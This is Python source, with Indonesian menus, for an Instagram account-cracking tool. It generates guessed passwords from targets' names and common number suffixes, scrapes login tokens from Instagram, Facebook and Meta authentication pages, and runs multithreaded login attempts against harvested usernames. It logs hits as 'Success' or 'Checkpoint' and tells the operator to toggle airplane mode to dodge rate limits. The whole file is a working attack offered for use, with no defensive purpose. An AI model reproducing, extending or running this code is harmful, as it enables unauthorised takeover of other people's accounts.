[bold green]05[bold white]. Gunakan Password Lengkap ([bold green]Nama, Nama123, Nama12345, Dll[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Pilih Password) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
            password = Console().input("[bold royal_blue1]   ╰─> ")
            if password == '1' or password == '01':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Angka Atau Huruf Lebih Dari 6, Gunakan Koma Untuk Password Yang Berbeda, Misalnya :[italic green] Sayang,Bangsat,123456[italic red] *Wajib Lebih Dari 1 Password", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Password Manual) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                passw = Console().input("[bold royal_blue1]   ╰─> ")
                if len(passw.split(',')) > 0:
                    Password.update({
                        "Password": 1
                    })
                    Manual.append(passw)
                else:
                    exit()
            elif password == '2' or password == '02':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Angka Atau Karakter Di Depan Nama, Misalnya :[italic green] 123,12345[italic red] *Wajib 2 Tidak Boleh Kurang Atau Lebih", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Password Customize) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                passw = Console().input("[bold royal_blue1]   ╰─> ")
                if len(passw.split(',')) == 2:
                    Password.update({
                        "Password": 2
                    })
                    Manual.append(passw.replace(' ',''))
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Silahkan Bacalah Catatan Sebelum Memasukan Password!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
            elif password == '3' or password == '03':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Angka Atau Huruf Lebih Dari 6, Gunakan Koma Untuk Password Yang Berbeda, Misalnya :[italic green] Sayang,Bangsat,123456[italic red] *Wajib Lebih Dari 1 Password", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Password Gabungan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                passw = Console().input("[bold royal_blue1]   ╰─> ")
                if len(passw.split(',')) > 0:
                    Password.update({
                        "Password": 3
                    })
                    Manual.append(passw)
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Silahkan Bacalah Catatan Sebelum Memasukan Password!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
            elif password == '4' or password == '04':
                Password.update({
                        "Password": 4
                })
            else:
                Password.update({
                        "Password": 5
                })
            Crack().Pilihan_Method()
        except (KeyboardInterrupt):
            exit()
        except (Exception):
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
            exit()

class Crack:

    def __init__(self) -> None:
        pass

    def Generate_Password(self, name):
        self.password = []
        if str(Password['Password']) == '1': # Password manual
            for join in Manual[0].split(','):
                if str(join) in str(self.password):
                    continue
                else:
                    self.password.append(join.lower())
            return (self.password)
        elif str(Password['Password']) == '2': # Password customize
            try:
                self.satu, self.dua = Manual[0].split(',')[0], Manual[0].split(',')[1]
            except (Exception):
                self.satu, self.dua = ('123'), ('12345')
            for nama in name.split(' '):
                if len(nama) < 3:
                    continue
                else:
                    for passwords in [f'{nama}{self.satu}', f'{nama}{self.dua}']:
                        if len(passwords) < 6 or len(name.split(' ')) > 5:
                            continue
                        else:
                            self.password.append(f'{str(passwords).lower()}')
            for passwords in [f'{name}', f'{name.replace(" ", "")}']:
                if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                    continue
                else:
                    self.password.append(f'{str(passwords).lower()}')
            return (self.password)
        elif str(Password['Password']) == '3': # Password gabungan
            for nama in name.split(' '):
                if len(nama) < 3:
                    continue
                else:
                    for passwords in [f'{nama}123', f'{nama}12345']:
                        if len(passwords) < 6 or str(passwords).isalnum() == False or len(name.split(' ')) > 5:
                            continue
                        else:
                            self.password.append(f'{str(passwords).lower()}')
            for join in Manual[0].split(','):
                if join in self.password:
                    continue
                else:
                    self.password.append(join.lower())
            for passwords in [f'{name}', f'{name.replace(" ", "")}']:
                if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                    continue
                else:
                    self.password.append(f'{str(passwords).lower()}')
            return (self.password)
        elif str(Password['Password']) == '4': # Password default
            for nama in name.split(' '):
                if len(nama) < 3:
                    continue
                else:
                    for passwords in [f'{nama}123', f'{nama}12345']:
                        if len(passwords) < 6 or str(passwords).isalnum() == False or len(name.split(' ')) > 5:
                            continue
                        else:
                            self.password.append(f'{str(passwords).lower()}')
            for passwords in [f'{name}', f'{name.replace(" ", "")}']:
                if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                    continue
                else:
                    self.password.append(f'{str(passwords).lower()}')
            return (self.password)
        else: # Password lengkap
            for nama in name.split(' '):
                if len(nama) < 3:
                    continue
                else:
                    for passwords in [f'{nama}123', f'{nama}1234', f'{nama}12345', f'{nama}123456']:
                        if len(passwords) < 6 or str(passwords).isalnum() == False or len(name.split(' ')) > 5:
                            continue
                        else:
                            self.password.append(f'{str(passwords).lower()}')
            for passwords in [f'{name}', f'{name.replace(" ", "")}']:
                if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                    continue
                else:
                    self.password.append(f'{str(passwords).lower()}')
            return (self.password)
    
    def Pilihan_Method(self):
        try:
            self.pilih_metode = str(Metode['Method'])
            if self.pilih_metode == '2' or self.pilih_metode == '02':
                Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Gunakan Encryption Password ([bold red]Not Recommended[bold white])
[bold green]02[bold white]. Jangan Menggunakan Encryption Password ([bold green]Recommended[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Encrypt Password) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                encrypt_password = Console().input("[bold royal_blue1]   ╰─> ")
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Hidup Dan Matikan[italic yellow] Mode Pesawat[italic white] Jika Ada Perintah Dan Jika Muncul Tulisan[italic red] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergantung Dari Useragent Yang Kamu Pilih Dan Provider Kamu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                with ThreadPoolExecutor(max_workers=35) as (X):
                    for z in Dump:
                        self.username, self.full_name = z.split('|')[0], z.split('|')[1]
                        self.password = self.Generate_Password(self.full_name)
                        X.submit(self.MAIN_API_2023, Dump, self.username, self.password, encrypt_password)
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic green] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan Mendapatkan[italic red] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white], Semua Hasil[italic blue] Berhasil[italic white] Tersimpan Di Floder[italic green] Results[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Crack Selesai) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            elif self.pilih_metode == '3' or self.pilih_metode == '03':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Hidup Dan Matikan[italic yellow] Mode Pesawat[italic white] Jika Ada Perintah Dan Jika Muncul Tulisan[italic red] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergantung Dari Useragent Yang Kamu Pilih Dan Provider Kamu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                with ThreadPoolExecutor(max_workers=35) as (X):
                    for z in Dump:
                        self.username, self.full_name = z.split('|')[0], z.split('|')[1]
                        self.password = self.Generate_Password(self.full_name)
                        X.submit(self.MAIN_THREADS_2023, Dump, self.username, self.password, '01')
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic green] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan Mendapatkan[italic red] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white], Semua Hasil[italic blue] Berhasil[italic white] Tersimpan Di Floder[italic green] Results[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Crack Selesai) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            elif self.pilih_metode == '4' or self.pilih_metode == '04':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Hidup Dan Matikan[italic yellow] Mode Pesawat[italic white] Jika Ada Perintah Dan Jika Muncul Tulisan[italic red] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergantung Dari Useragent Yang Kamu Pilih Dan Provider Kamu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                with ThreadPoolExecutor(max_workers=35) as (X):
                    for z in Dump:
                        self.username, self.full_name = z.split('|')[0], z.split('|')[1]
                        self.password = self.Generate_Password(self.full_name)
                        X.submit(self.MAIN_API_2019, Dump, self.username, self.password)
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic green] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan Mendapatkan[italic red] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white], Semua Hasil[italic blue] Berhasil[italic white] Tersimpan Di Floder[italic green] Results[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Crack Selesai) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            elif self.pilih_metode == '5' or self.pilih_metode == '05':
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Hidup Dan Matikan[italic yellow] Mode Pesawat[italic white] Jika Ada Perintah Dan Jika Muncul Tulisan[italic red] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergantung Dari Useragent Yang Kamu Pilih Dan Provider Kamu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                with ThreadPoolExecutor(max_workers=35) as (X):
                    for z in Dump:
                        self.username, self.full_name = z.split('|')[0], z.split('|')[1]
                        self.password = self.Generate_Password(self.full_name)
                        X.submit(self.MAIN_API_2018, Dump, self.username, self.password)
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic green] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan Mendapatkan[italic red] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white], Semua Hasil[italic blue] Berhasil[italic white] Tersimpan Di Floder[italic green] Results[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Crack Selesai) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            elif self.pilih_metode == '6' or self.pilih_metode == '06':
                try:
                    with requests.Session() as r:
                        r.headers.update({
                            'Host': 'accountscenter.instagram.com',
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-language': 'en-US,en;q=0.9',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                            'referer': 'https://www.instagram.com/',
                            'sec-fetch-site': 'same-origin',
                        })

                        response = r.get('https://accountscenter.instagram.com/profiles/', cookies = {
                            'cookie': json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
                        }).text
                        self.x_fb_lsd = re.search('\\["LSD",\\[\\],{"token":"(.*?)"}', str(response)).group(1)
                        self.av = re.search('"actorID":"(\d+)"', str(response)).group(1)
                        self.__hs = re.search('"haste_session":"(.*?)"', str(response)).group(1)
                        self.__rev = re.search('"__spin_r":(\d+),', str(response)).group(1)
                        self.fb_dtsg = re.search('{"token":"(.*?)"}', str(response)).group(1)
                        self.__spin_r__spin_b__spin_t = re.findall('"__spin_r":(\d+),"__spin_b":"(.*?)","__spin_t":(\d+),', str(response))

                        r.headers.update({
                            'x-fb-friendly-name': 'FXMANIAccountTypeSelectionDialogQuery',
                            'sec-fetch-mode': 'cors',
                            'origin': 'https://accountscenter.instagram.com',
                            'x-fb-lsd': self.x_fb_lsd,
                            'sec-fetch-dest': 'empty',
                            'content-type': 'application/x-www-form-urlencoded',
                            'accept': '*/*',
                            'referer': 'https://accountscenter.instagram.com/profiles/',
                            'x-asbd-id': '198387',
                            'x-ig-app-id': '936619743392459',
                        })

                        data = {
                            'fb_api_req_friendly_name': 'FXMANIAccountTypeSelectionDialogQuery',
                            'doc_id': '4712458082189874',
                            '__ccg': 'GOOD',
                            'variables': '{"device_id":"","flow":"IG_WEB_SETTINGS"}',
                            'lsd': self.x_fb_lsd,
                            'av': self.av,
                            '__spin_r': self.__spin_r__spin_b__spin_t[0][0],
                            '__user': '0',
                            '__comet_req': '24',
                            'server_timestamps': True,
                            '__a': '1',
                            'fb_dtsg': self.fb_dtsg,
                            '__req': 'b',
                            '__spin_b': self.__spin_r__spin_b__spin_t[0][1],
                            'jazoest': '26261',
                            '__hs': self.__hs,
                            'dpr': '1.5',
                            '__spin_t': self.__spin_r__spin_b__spin_t[0][2],
                            '__rev': self.__rev,
                            'fb_api_caller_class': 'RelayModern',
                        }

                        response2 = json.loads(r.post('https://accountscenter.instagram.com/api/graphql/', data = data, cookies = {
                            'cookie': json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
                        }).text)
                        try:
                            self.url_fxcal_auth = response2['data']['fxcal_web_flow_init']['multi_web_auth'][1]['config']['url']
                        except (IndexError):
                            self.url_fxcal_auth = response2['data']['fxcal_web_flow_init']['multi_web_auth'][0]['config']['url']
                except (Exception):
                    self.url_fxcal_auth = ('https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&etoken=Abi9UBRQVdt4D9amUTSI2Xh6asFjyBhVSQrM6ybQG4OB76IVuwU55o-Y0biC9Z546IhqWzs02XXygxqQYhAvkUe-AmF76HpBslHDCkYgU3YRkeH8i3fDWpt7&next=https%3A%2F%2Faccountscenter.instagram.com%2F%3Fauth_flow%3Dig_linking')
                Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Gunakan Encryption Password ([bold red]Not Recommended[bold white])
[bold green]02[bold white]. Jangan Menggunakan Encryption Password ([bold green]Recommended[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Encrypt Password) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                encrypt_password = Console().input("[bold royal_blue1]   ╰─> ")
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Hidup Dan Matikan[italic yellow] Mode Pesawat[italic white] Jika Ada Perintah Dan Jika Muncul Tulisan[italic red] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergantung Dari Useragent Yang Kamu Pilih Dan Provider Kamu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                with ThreadPoolExecutor(max_workers=35) as (X):
                    for z in Dump:
                        self.username, self.full_name = z.split('|')[0], z.split('|')[1]
                        self.password = self.Generate_Password(self.full_name)
                        X.submit(self.MAIN_AJAX_FXCAL_AUTH_INSTAGRAM, Dump, self.username, self.password, self.url_fxcal_auth, encrypt_password)
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic green] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan Mendapatkan[italic red] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white], Semua Hasil[italic blue] Berhasil[italic white] Tersimpan Di Floder[italic green] Results[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Crack Selesai) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            elif self.pilih_metode == '7' or self.pilih_metode == '07':
                try:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Cookies[italic white] Akun Facebook, Gunakan Akun Tumbal Untuk Login Dan Pastikan Menggunakan[italic red] Bahasa Indonesia[italic white].", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Cookies Facebook) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    cookies_facebook = Console().input("[bold royal_blue1]   ╰─> ")
                    with requests.Session() as r:
                        r.headers.update({
                            'Host': 'accountscenter.facebook.com',
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-language': 'en-US,en;q=0.9',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                            'sec-fetch-site': 'same-origin',
                        })

                        response = r.get('https://accountscenter.facebook.com/profiles/', cookies = {
                            'cookie': cookies_facebook
                        }).text
                        self.url_fxcal_auth = re.search('{"url":"(.*?)",.*?"account_type":"INSTAGRAM"}', str(response)).group(1).replace('\\', '')
                except (Exception):
                    self.url_fxcal_auth = ('https://www.instagram.com/fxcal/auth/login/?app_id=2220391788200892&etoken=AbhbhithlVqNuTRgPpwiSvKA6VT1Z2RV45J4XSF4LCIea33cu6btPS1_vcjRN0NRyvA0YfSyevmXaOcXUP3mZi3xFgTvOh-ptfp6MsPjalVoFfQbcj0&next=https%3A%2F%2Faccountscenter.facebook.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252Fprofiles%252F&fbclid=IwAR2n5Z-ZSpiIz8gQYPa-enLS1YcCqhWTrMF2r7TGskUeLU8ji3rd6pupkWI')
                Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Gunakan Encryption Password ([bold red]Not Recommended[bold white])
[bold green]02[bold white]. Jangan Menggunakan Encryption Password ([bold green]Recommended[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Encrypt Password) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                encrypt_password = Console().input("[bold royal_blue1]   ╰─> ")
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Hidup Dan Matikan[italic yellow] Mode Pesawat[italic white] Jika Ada Perintah Dan Jika Muncul Tulisan[italic red] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergantung Dari Useragent Yang Kamu Pilih Dan Provider Kamu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                with ThreadPoolExecutor(max_workers=35) as (X):
                    for z in Dump:
                        self.username, self.full_name = z.split('|')[0], z.split('|')[1]
                        self.password = self.Generate_Password(self.full_name)
                        X.submit(self.MAIN_AJAX_FXCAL_AUTH_FACEBOOK, Dump, self.username, self.password, self.url_fxcal_auth, encrypt_password)
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic green] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan Mendapatkan[italic red] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white], Semua Hasil[italic blue] Berhasil[italic white] Tersimpan Di Floder[italic green] Results[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Crack Selesai) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            else:
                try:
                    with requests.Session() as r:
                        r.headers.update({
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-language': 'en-US,en;q=0.9',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                            'referer': 'https://auth.meta.com/',
                            'Host': 'auth.meta.com',
                            'sec-fetch-site': 'same-origin',
                        })

                        response = r.get('https://auth.meta.com/').text

                        self.__hs = re.search('"haste_session":"(.*?)"', str(response)).group(1)
                        self.lsd = re.search('\\["LSD",\\[\\],{"token":"(.*?)"}', str(response)).group(1)
                        self.__hsi = re.search('"hsi":"(\d+)"', str(response)).group(1)
                        self.__spin_r__spin_b__spin_t = re.findall('"__spin_r":(\d+),"__spin_b":"(.*?)","__spin_t":(\d+),', str(response))
                        self._js_datr = re.search('{"_js_datr":{"value":"(.*?)",', str(response)).group(1)
                        self.meta_csrf = re.search('"meta_csrf":{"value":"(.*?)",', str(response)).group(1)

                        r.headers.update({
                            'content-type': 'application/x-www-form-urlencoded',
                            'sec-fetch-mode': 'cors',
                            'referer': 'https://auth.meta.com/',
                            'accept': '*/*',
                            'sec-fetch-dest': 'empty',
                            'x-asbd-id': '129477',
                            'cookie': 'meta_csrf={}; datr={}'.format(self.meta_csrf, self._js_datr),
                            'x-fb-lsd': self.lsd,
                            'origin': 'https://auth.meta.com',
                        })

                        data = {
                            '__user': '0',
                            '__rev': self.__spin_r__spin_b__spin_t[0][0],
                            '__jssesw': '1',
                            'jazoest': '21008',
                            '__spin_b': self.__spin_r__spin_b__spin_t[0][1],
                            '__req': '5',
                            '__a': '1',
                            '__ccg': 'UNKNOWN',
                            '__dyn': '',
                            '__spin_t': self.__spin_r__spin_b__spin_t[0][2],
                            'dpr': '1',
                            '__hsi': self.__hsi,
                            '__csr': '',
                            '__comet_req': '1',
                            '__hs': self.__hs,
                            '__spin_r': self.__spin_r__spin_b__spin_t[0][0],
                            'lsd': self.lsd,
                        }
                        response2 = r.post('https://auth.meta.com/api/login/instagram/', data = data).text
                        self.loginURI = re.search('{"loginURI":"(.*?)"}', str(response2)).group(1).replace('\\', '').replace('api.instagram.com', 'www.instagram.com')
                        r.headers.pop('content-type')
                        r.headers.pop('origin')
                        r.headers.update({
                            'sec-fetch-mode': 'navigate',
                            'Host': 'www.instagram.com',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-user': '?1',
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'sec-fetch-site': 'cross-site',
                        })
                        response3 = r.get(self.loginURI)
                        if 'https://www.instagram.com/accounts/login/?force_authentication=' in str(response3.url):
                            self.force_authentication_url = (response3.url)
                        else:
                            self.force_authentication_url = ('https://www.instagram.com/accounts/login/?force_authentication=1&enable_fb_login=1&next=/oauth/authorize%3Fclient_id%3D200289238967899%26redirect_uri%3Dhttps%3A//auth.meta.com/login/instagram/response/%3Fstate%3DATC7l1MKDQsD6Z4x3DZAXCnSTmOQZ1I9Qa15CMzxjL-Hma5LgLoR1U0VFGiJhpPAd5pkAtfgoWi7dz8CdkxHu6FHIDdA5nO5X2iOJk6DWNxJOd4ChyBNWvXRrxJjh8Hk77J4E7VyOOIBgB0N6qIjdFe3k9uj9A7EvsRyk1D6726924kJM53B4qzdZ2nITfvyzGuUe-_eua1irPeV_xIKUiofnUNeQUeVLQAxqGV2GchXE2EXKmwTefm3nEP03l4zMe3HuBXGxVmGfMo6Qg%26response_type%3Dcode%26scope%3Duser_profile%26state%3DATC7l1MKDQsD6Z4x3DZAXCnSTmOQZ1I9Qa15CMzxjL-Hma5LgLoR1U0VFGiJhpPAd5pkAtfgoWi7dz8CdkxHu6FHIDdA5nO5X2iOJk6DWNxJOd4ChyBNWvXRrxJjh8Hk77J4E7VyOOIBgB0N6qIjdFe3k9uj9A7EvsRyk1D6726924kJM53B4qzdZ2nITfvyzGuUe-_eua1irPeV_xIKUiofnUNeQUeVLQAxqGV2GchXE2EXKmwTefm3nEP03l4zMe3HuBXGxVmGfMo6Qg%26logger_id%3Dfb162918-c811-4a70-bbd3-18917b07de41')
                except (Exception):
                    self.force_authentication_url = ('https://www.instagram.com/accounts/login/?force_authentication=1&enable_fb_login=1&next=/oauth/authorize%3Fclient_id%3D200289238967899%26redirect_uri%3Dhttps%3A//auth.meta.com/login/instagram/response/%3Fstate%3DATC7l1MKDQsD6Z4x3DZAXCnSTmOQZ1I9Qa15CMzxjL-Hma5LgLoR1U0VFGiJhpPAd5pkAtfgoWi7dz8CdkxHu6FHIDdA5nO5X2iOJk6DWNxJOd4ChyBNWvXRrxJjh8Hk77J4E7VyOOIBgB0N6qIjdFe3k9uj9A7EvsRyk1D6726924kJM53B4qzdZ2nITfvyzGuUe-_eua1irPeV_xIKUiofnUNeQUeVLQAxqGV2GchXE2EXKmwTefm3nEP03l4zMe3HuBXGxVmGfMo6Qg%26response_type%3Dcode%26scope%3Duser_profile%26state%3DATC7l1MKDQsD6Z4x3DZAXCnSTmOQZ1I9Qa15CMzxjL-Hma5LgLoR1U0VFGiJhpPAd5pkAtfgoWi7dz8CdkxHu6FHIDdA5nO5X2iOJk6DWNxJOd4ChyBNWvXRrxJjh8Hk77J4E7VyOOIBgB0N6qIjdFe3k9uj9A7EvsRyk1D6726924kJM53B4qzdZ2nITfvyzGuUe-_eua1irPeV_xIKUiofnUNeQUeVLQAxqGV2GchXE2EXKmwTefm3nEP03l4zMe3HuBXGxVmGfMo6Qg%26logger_id%3Dfb162918-c811-4a70-bbd3-18917b07de41')
                Console(width=71, style="bold royal_blue1").print(Panel("""[bold green]01[bold white]. Gunakan Encryption Password ([bold red]Not Recommended[bold white])
[bold green]02[bold white]. Jangan Menggunakan Encryption Password ([bold green]Recommended[bold white])""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Encrypt Password) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                encrypt_password = Console().input("[bold royal_blue1]   ╰─> ")
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Hidup Dan Matikan[italic yellow] Mode Pesawat[italic white] Jika Ada Perintah Dan Jika Muncul Tulisan[italic red] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergantung Dari Useragent Yang Kamu Pilih Dan Provider Kamu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                with ThreadPoolExecutor(max_workers=35) as (X):
                    for z in Dump:
                        self.username, self.full_name = z.split('|')[0], z.split('|')[1]
                        self.password = self.Generate_Password(self.full_name)
                        X.submit(self.MAIN_AJAX, Dump, self.username, self.password, self.force_authentication_url, encrypt_password)
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic green] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan Mendapatkan[italic red] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white], Semua Hasil[italic blue] Berhasil[italic white] Tersimpan Di Floder[italic green] Results[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Crack Selesai) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        except (KeyboardInterrupt, Exception):
            exit()

    def MAIN_AJAX_FXCAL_AUTH_FACEBOOK(self, total, username, password, url_fxcal_auth, encrypt_password):
        global Checkpoint, Sukses, Looping
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    self.persen = Looping * 100 / len(total)
                    with requests.Session() as r:
                        self.useragent = Generate_Useragent().Android_Useragent()
                        r.headers.update({
                            'Host': 'www.instagram.com',
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-language': 'en-US,en;q=0.9',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'none',
                            'cache-control': 'max-age=0',
                            'sec-fetch-user': '?1',
                            'sec-fetch-dest': 'document',
                            'connection': 'keep-alive',
                            'Accept-Encoding': 'gzip, deflate',
                            'upgrade-insecure-requests': '1',
                            'user-agent': self.useragent,
                        })
                        response = r.get(url_fxcal_auth).text
                        try:
                            self.x_csrftoken = re.search('{"csrf_token":"(.*?)"', str(response)).group(1)
                            self.x_ig_app_id = re.search('{"app_id":"(\d+)"', str(response)).group(1)
                            self.etoken = re.search('"etoken":"(.*?)"', str(response)).group(1)
                            self.x_instagram_ajax = re.search('"rollout_hash":"(.*?)"', str(response)).group(1)
                            self.find_enc_pass = re.search('{"key_id":"(\d+)","public_key":"(.*?)","version":"(\d+)"}', str(response))
                            self.key_id, self.public_key, self.version = self.find_enc_pass.group(1), self.find_enc_pass.group(2), self.find_enc_pass.group(3)
                        except (AttributeError):
                            Console().print("\r                                                                       ", end='\r')
                            time.sleep(0.07)
                            Console().print(f"[bold royal_blue1]   ──>[bold red] ATTRIBUTE ERROR![bold white]", end='\r')
                            time.sleep(5.6)
                            continue
                        r.headers.pop('upgrade-insecure-requests');r.headers.pop('cache-control')
                        if encrypt_password == '1' or encrypt_password == '01':
                            self.enc_password = self.Encrypt_Password(int(self.key_id), self.public_key, pws, int(self.version))
                        else:
                            self.enc_password = (f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pws}')
                        data = {
                            'enc_password': self.enc_password,
                            'etoken': self.etoken,
